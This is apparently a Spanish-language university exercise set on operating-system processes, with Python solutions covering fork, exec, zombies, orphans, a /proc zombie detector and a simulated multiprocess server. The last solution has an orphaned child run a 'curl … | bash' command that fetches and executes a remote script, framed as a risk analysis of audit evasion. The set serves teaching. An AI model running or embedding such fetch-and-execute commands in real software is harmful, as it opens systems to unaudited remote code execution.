# Ejercicios sobre Procesos en Sistemas Operativos

Este conjunto de ejercicios está diseñado para afianzar los conceptos clave sobre procesos, tal como se abordaron en el marco teórico. Comienza con tareas básicas y progresa hacia desafíos más complejos con implicaciones en seguridad, análisis forense y comportamiento anómalo del sistema.

---

## Sección 1: Enunciados de los Ejercicios

### Ejercicio 1: Identificación de procesos padre e hijo
Crea un programa que genere un proceso hijo utilizando `fork()` y que ambos (padre e hijo) impriman sus respectivos PID y PPID. El objetivo es observar la relación jerárquica entre ellos.

---

### Ejercicio 2: Doble bifurcación
Escribe un programa donde un proceso padre cree dos hijos diferentes (no en cascada), y cada hijo imprima su identificador. El padre deberá esperar a que ambos terminen.

---

### Ejercicio 3: Reemplazo de un proceso hijo con `exec()`
Haz que un proceso hijo reemplace su contexto de ejecución con un programa del sistema, por ejemplo, el comando `ls -l`, utilizando `exec()`.

---

### Ejercicio 4: Secuencia controlada de procesos
Diseña un programa donde se creen dos hijos de manera secuencial: se lanza el primero, se espera a que finalice, y luego se lanza el segundo. Cada hijo debe realizar una tarea mínima.

---

### Ejercicio 5: Proceso zombi temporal
Crea un programa que genere un proceso hijo que termine inmediatamente, pero el padre no debe recoger su estado de salida durante algunos segundos. Observa su estado como zombi con herramientas del sistema.

---

### Ejercicio 6: Proceso huérfano adoptado por `init`
Genera un proceso hijo que siga ejecutándose luego de que el padre haya terminado. Verifica que su nuevo PPID corresponda al proceso `init` o `systemd`.

---

### Ejercicio 7: Multiproceso paralelo
Construye un programa que cree tres hijos en paralelo (no secuenciales). Cada hijo ejecutará una tarea breve y luego finalizará. El padre debe esperar por todos ellos.

---

### Ejercicio 8: Simulación de servidor multiproceso
Imita el comportamiento de un servidor concurrente que atiende múltiples clientes creando un proceso hijo por cada uno. Cada proceso debe simular la atención a un cliente con un `sleep()`.

---

### Ejercicio 9: Detección de procesos zombis en el sistema
Escribe un script que recorra `/proc` y detecte procesos en estado zombi, listando su PID, PPID y nombre del ejecutable. Este ejercicio debe realizarse sin utilizar `ps`.

---

### Ejercicio 10: Inyección de comandos en procesos huérfanos (Análisis de riesgo)
Simula un escenario donde un proceso huérfano ejecuta un comando externo sin control del padre. Analiza qué implicaciones tendría esto en términos de seguridad o evasión de auditorías.

---

## Sección 2: Ejercicios Resueltos

### Ejercicio 1: Identificación de procesos padre e hijo

```python
import os

pid = os.fork()
if pid == 0:
    print("[HIJO] PID:", os.getpid(), "PPID:", os.getppid())
else:
    print("[PADRE] PID:", os.getpid(), "Hijo:", pid)
```

---

### Ejercicio 2: Doble bifurcación

```python
import os

for i in range(2):
    pid = os.fork()
    if pid == 0:
        print(f"[HIJO {i}] PID: {os.getpid()}  Padre: {os.getppid()}")
        os._exit(0)

for _ in range(2):
    os.wait()
```

---

### Ejercicio 3: Reemplazo de un proceso hijo con `exec()`

```python
import os

pid = os.fork()
if pid == 0:
    os.execlp("ls", "ls", "-l")  # Reemplaza el proceso hijo
else:
    os.wait()
```

---

### Ejercicio 4: Secuencia controlada de procesos

```python
import os
import time

def crear_hijo(nombre):
    pid = os.fork()
    if pid == 0:
        print(f"[HIJO {nombre}] PID: {os.getpid()}")
        time.sleep(1)
        os._exit(0)
    else:
        os.wait()

crear_hijo("A")
crear_hijo("B")
```

---

### Ejercicio 5: Proceso zombi temporal

```python
import os, time

pid = os.fork()
if pid == 0:
    print("[HIJO] Finalizando")
    os._exit(0)
else:
    print("[PADRE] No llamaré a wait() aún. Observa el zombi con 'ps -el'")
    time.sleep(15)
    os.wait()
```

---

### Ejercicio 6: Proceso huérfano adoptado por `init`

```python
import os, time

pid = os.fork()
if pid > 0:
    print("[PADRE] Terminando")
    os._exit(0)
else:
    print("[HIJO] Ahora soy huérfano. Mi nuevo padre será init/systemd")
    time.sleep(10)
```

---

### Ejercicio 7: Multiproceso paralelo

```python
import os

for _ in range(3):
    pid = os.fork()
    if pid == 0:
        print(f"[HIJO] PID: {os.getpid()}  Padre: {os.getppid()}")
        os._exit(0)

for _ in range(3):
    os.wait()
```

---

### Ejercicio 8: Simulación de servidor multiproceso

```python
import os, time

def atender_cliente(n):
    pid = os.fork()
    if pid == 0:
        print(f"[HIJO {n}] Atendiendo cliente")
        time.sleep(2)
        print(f"[HIJO {n}] Finalizado")
        os._exit(0)

for cliente in range(5):
    atender_cliente(cliente)

for _ in range(5):
    os.wait()
```

---

### Ejercicio 9: Detección de procesos zombis en `/proc`

```python
import os

def detectar_zombis():
    for pid in os.listdir('/proc'):
        if pid.isdigit():
            try:
                with open(f"/proc/{pid}/status") as f:
                    lines = f.readlines()
                    estado = next((l for l in lines if l.startswith("State:")), "")
                    if "Z" in estado:
                        nombre = next((l for l in lines if l.startswith("Name:")), "").split()[1]
                        ppid = next((l for l in lines if l.startswith("PPid:")), "").split()[1]
                        print(f"Zombi detectado → PID: {pid}, PPID: {ppid}, Nombre: {nombre}")
            except IOError:
                continue

detectar_zombis()
```

---

### Ejercicio 10: Inyección de comandos en procesos huérfanos

```python
import os, time

pid = os.fork()
if pid > 0:
    os._exit(0)  # El padre termina inmediatamente
else:
    print("[HIJO] Ejecutando script como huérfano...")
    os.system("curl http://example.com/script.sh | bash")  # Peligroso si no hay control
    time.sleep(3)
```

---

## Recomendaciones Finales

- Usa `htop`, `pstree`, y `ps -el` para observar los efectos de cada ejercicio.
- Ejecuta con permisos limitados y en entornos de prueba (máquinas virtuales o contenedores).
- Modifica los códigos para generar variantes: múltiples niveles de procesos, procesos que fallan, etc.

---
